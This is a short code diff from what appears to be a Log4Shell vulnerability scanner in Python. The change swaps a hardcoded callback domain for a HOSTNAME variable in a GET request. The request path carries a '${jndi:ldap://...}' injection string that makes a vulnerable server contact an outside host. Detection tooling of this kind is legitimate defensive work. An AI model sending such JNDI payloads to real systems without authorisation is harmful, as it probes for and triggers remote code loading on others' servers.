@@ -39,7 +39,7 @@ def main():
     logging.info(f"Sending request to {url_input} using GET request injection: {url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}")
     try:
         requests.get(
-            f"{url_input}/${{jndi:ldap://{identifier}.log4jdns.nwlab.nl/test.class}}",
+            f"{url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}",
             verify=False
         )
     except requests.exceptions.ConnectionError as e:
